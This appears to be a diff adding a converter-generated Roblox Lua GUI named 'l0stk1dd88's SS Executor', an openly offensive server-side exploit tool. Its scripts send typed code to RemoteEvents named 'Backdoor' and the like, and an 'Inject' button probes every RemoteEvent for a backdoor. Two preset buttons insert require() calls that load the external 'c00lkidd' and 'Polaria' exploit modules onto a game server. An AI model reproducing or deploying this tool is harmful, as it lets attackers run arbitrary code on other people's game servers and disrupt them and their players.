@@ -1,0 +1,344 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
+
+-- Instances: 16 | Scripts: 4 | Modules: 0 | Tags: 0
+local G2L = {};
+
+-- StarterGui.ScreenGui
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+-- StarterGui.ScreenGui.MainFrame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 42, 204);
+G2L["2"]["Size"] = UDim2.new(0, 312, 0, 337);
+G2L["2"]["Position"] = UDim2.new(0.43507, 0, 0.20477, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Name"] = [[MainFrame]];
+
+
+-- StarterGui.ScreenGui.MainFrame.LocalScript
+G2L["3"] = Instance.new("LocalScript", G2L["2"]);
+
+
+
+-- StarterGui.ScreenGui.MainFrame.LocalScript
+G2L["4"] = Instance.new("LocalScript", G2L["2"]);
+
+
+
+-- StarterGui.ScreenGui.MainFrame.ImageLabel
+G2L["5"] = Instance.new("ImageLabel", G2L["2"]);
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["5"]["Image"] = [[rbxassetid://103157789766561]];
+G2L["5"]["Size"] = UDim2.new(0, 290, 0, 149);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["BackgroundTransparency"] = 1;
+G2L["5"]["Position"] = UDim2.new(0.03391, 0, 0.14147, 0);
+
+
+-- StarterGui.ScreenGui.MainFrame.TextLabel
+G2L["6"] = Instance.new("TextLabel", G2L["2"]);
+G2L["6"]["TextWrapped"] = true;
+G2L["6"]["BorderSizePixel"] = 0;
+G2L["6"]["TextSize"] = 14;
+G2L["6"]["TextScaled"] = true;
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["BackgroundTransparency"] = 1;
+G2L["6"]["Size"] = UDim2.new(0, 312, 0, 26);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["Text"] = [[l0stk1dd88's SS Executor]];
+
+
+-- StarterGui.ScreenGui.MainFrame.Execute
+G2L["7"] = Instance.new("TextButton", G2L["2"]);
+G2L["7"]["TextWrapped"] = true;
+G2L["7"]["BorderSizePixel"] = 0;
+G2L["7"]["TextSize"] = 14;
+G2L["7"]["TextScaled"] = true;
+G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7"]["Size"] = UDim2.new(0, 91, 0, 39);
+G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7"]["Text"] = [[Execute]];
+G2L["7"]["Name"] = [[Execute]];
+G2L["7"]["Position"] = UDim2.new(0.03205, 0, 0.60348, 0);
+
+
+-- StarterGui.ScreenGui.MainFrame.Clear
+G2L["8"] = Instance.new("TextButton", G2L["2"]);
+G2L["8"]["TextWrapped"] = true;
+G2L["8"]["BorderSizePixel"] = 0;
+G2L["8"]["TextSize"] = 14;
+G2L["8"]["TextScaled"] = true;
+G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8"]["Size"] = UDim2.new(0, 91, 0, 39);
+G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8"]["Text"] = [[Clear]];
+G2L["8"]["Name"] = [[Clear]];
+G2L["8"]["Position"] = UDim2.new(0.35256, 0, 0.60348, 0);
+
+
+-- StarterGui.ScreenGui.MainFrame.Inject
+G2L["9"] = Instance.new("TextButton", G2L["2"]);
+G2L["9"]["TextWrapped"] = true;
+G2L["9"]["BorderSizePixel"] = 0;
+G2L["9"]["TextSize"] = 14;
+G2L["9"]["TextScaled"] = true;
+G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9"]["Size"] = UDim2.new(0, 91, 0, 39);
+G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9"]["Text"] = [[Inject]];
+G2L["9"]["Name"] = [[Inject]];
+G2L["9"]["Position"] = UDim2.new(0.66987, 0, 0.60348, 0);
+
+
+-- StarterGui.ScreenGui.MainFrame.TextBox
+G2L["a"] = Instance.new("TextBox", G2L["2"]);
+G2L["a"]["CursorPosition"] = -1;
+G2L["a"]["PlaceholderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["BorderSizePixel"] = 0;
+G2L["a"]["TextWrapped"] = true;
+G2L["a"]["TextSize"] = 14;
+G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["TextScaled"] = true;
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a"]["PlaceholderText"] = [[Enter SS Script or require() here]];
+G2L["a"]["Size"] = UDim2.new(0, 290, 0, 149);
+G2L["a"]["Position"] = UDim2.new(0.03205, 0, 0.1405, 0);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["Text"] = [[]];
+G2L["a"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.ScreenGui.MainFrame.polaria
+G2L["b"] = Instance.new("TextButton", G2L["2"]);
+G2L["b"]["TextWrapped"] = true;
+G2L["b"]["BorderSizePixel"] = 0;
+G2L["b"]["TextSize"] = 14;
+G2L["b"]["TextScaled"] = true;
+G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b"]["Size"] = UDim2.new(0, 141, 0, 58);
+G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["Text"] = [[Polaria]];
+G2L["b"]["Name"] = [[polaria]];
+G2L["b"]["Position"] = UDim2.new(0.03205, 0, 0.75481, 0);
+
+
+-- StarterGui.ScreenGui.MainFrame.c00lgui
+G2L["c"] = Instance.new("TextButton", G2L["2"]);
+G2L["c"]["TextWrapped"] = true;
+G2L["c"]["BorderSizePixel"] = 0;
+G2L["c"]["TextSize"] = 14;
+G2L["c"]["TextScaled"] = true;
+G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c"]["Size"] = UDim2.new(0, 137, 0, 58);
+G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c"]["Text"] = [[C00lgui]];
+G2L["c"]["Name"] = [[c00lgui]];
+G2L["c"]["Position"] = UDim2.new(0.52244, 0, 0.75481, 0);
+
+
+-- StarterGui.ScreenGui.MainFrame.LocalScript
+G2L["d"] = Instance.new("LocalScript", G2L["2"]);
+
+
+
+-- StarterGui.ScreenGui.ToggleFrame
+G2L["e"] = Instance.new("Frame", G2L["1"]);
+G2L["e"]["BorderSizePixel"] = 0;
+G2L["e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 255);
+G2L["e"]["Size"] = UDim2.new(0, 39, 0, 35);
+G2L["e"]["Position"] = UDim2.new(0.76013, 0, 0.11935, 0);
+G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e"]["Name"] = [[ToggleFrame]];
+
+
+-- StarterGui.ScreenGui.ToggleFrame.ToggleButton
+G2L["f"] = Instance.new("ImageButton", G2L["e"]);
+G2L["f"]["BorderSizePixel"] = 0;
+G2L["f"]["BackgroundTransparency"] = 1;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f"]["Image"] = [[rbxassetid://135910981906620]];
+G2L["f"]["Size"] = UDim2.new(0, 39, 0, 35);
+G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f"]["Name"] = [[ToggleButton]];
+
+
+-- StarterGui.ScreenGui.LocalScript
+G2L["10"] = Instance.new("LocalScript", G2L["1"]);
+
+
+
+-- StarterGui.ScreenGui.MainFrame.LocalScript
+local function C_3()
+local script = G2L["3"];
+	local replicatedStorage = game:GetService("ReplicatedStorage")
+	
+	-- GUI references
+	local gui = script.Parent
+	local textbox = gui:FindFirstChild("TextBox")
+	local executeButton = gui:FindFirstChild("Execute")
+	local clearButton = gui:FindFirstChild("Clear")
+	local injectButton = gui:FindFirstChild("Inject")
+	
+	-- Safety check
+	if not textbox or not executeButton or not clearButton or not injectButton then
+		warn("Missing GUI components.")
+		return
+	end
+	
+	-- Execute payload from textbox
+	executeButton.MouseButton1Click:Connect(function()
+		local payload = textbox.Text
+		if payload and payload ~= "" then
+			local remote = replicatedStorage:FindFirstChild("Backdoor") or replicatedStorage:FindFirstChild("RemoteEvent") or replicatedStorage:FindFirstChild("RE")
+			if remote and remote:IsA("RemoteEvent") then
+				remote:FireServer(payload)
+			end
+		end
+	end)
+	
+	-- Clear textbox
+	clearButton.MouseButton1Click:Connect(function()
+		textbox.Text = ""
+	end)
+	
+	-- Inject: Loop through all RemoteEvents and test for backdoor execution
+	injectButton.MouseButton1Click:Connect(function()
+		local testPayload = 'print("Backdoor test from GAMING")'
+		local found = false
+	
+		for _, obj in ipairs(replicatedStorage:GetChildren()) do
+			if obj:IsA("RemoteEvent") then
+				local success = pcall(function()
+					obj:FireServer(testPayload)
+				end)
+	
+				if success then
+					found = true
+					print("Successfully injected into RemoteEvent! Remote name: " .. obj.Name)
+					break -- Stop after first successful injection
+				end
+			end
+		end
+	
+		if not found then
+			print("No active backdoor RemoteEvent found.")
+		end
+	end)
+end;
+task.spawn(C_3);
+-- StarterGui.ScreenGui.MainFrame.LocalScript
+local function C_4()
+local script = G2L["4"];
+	local frame = script.Parent
+	local dragging = false
+	local dragInput, mousePos, framePos
+	
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 then
+			dragging = true
+			mousePos = input.Position
+			framePos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	frame.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement then
+			dragInput = input
+		end
+	end)
+	
+	game:GetService("UserInputService").InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			local delta = input.Position - mousePos
+			frame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
+		end
+	end)
+	
+end;
+task.spawn(C_4);
+-- StarterGui.ScreenGui.MainFrame.LocalScript
+local function C_d()
+local script = G2L["d"];
+	local player = game.Players.LocalPlayer
+	local username = player.Name
+	
+	local gui = script.Parent
+	local textbox = gui:FindFirstChild("TextBox")
+	local c00lguiButton = gui:FindFirstChild("c00lgui")
+	local polariaButton = gui:FindFirstChild("polaria")
+	
+	-- Replace these with your actual module IDs
+	local c00lguiID = 123456789
+	local polariaID = 987654321
+	
+	-- Button: c00lgui
+	c00lguiButton.MouseButton1Click:Connect(function()
+		if textbox then
+			textbox.Text = 'require(14125553864):Fire("' .. username .. '","c00lkidd")'
+		end
+	end)
+	
+	-- Button: polaria
+	polariaButton.MouseButton1Click:Connect(function()
+		if textbox then
+			textbox.Text = 'require(' .. 123255432303221 .. '):Pload("' .. username .. '")'
+		end
+	end)
+end;
+task.spawn(C_d);
+-- StarterGui.ScreenGui.LocalScript
+local function C_10()
+local script = G2L["10"];
+	local screenGui = script.Parent
+	local mainFrame = screenGui:WaitForChild("MainFrame")
+	local toggleFrame = screenGui:WaitForChild("ToggleFrame")
+	local toggleButton = toggleFrame:WaitForChild("ToggleButton")
+	
+	local isVisible = true
+	
+	toggleButton.MouseButton1Click:Connect(function()
+		isVisible = not isVisible
+		mainFrame.Visible = isVisible
+	
+		-- Optional: update button text/icon
+		if isVisible then
+			toggleButton.Text = "⛶" -- Maximize
+		else
+			toggleButton.Text = "–" -- Minimize
+		end
+	end)
+end;
+task.spawn(C_10);
+
+return G2L["1"], require;
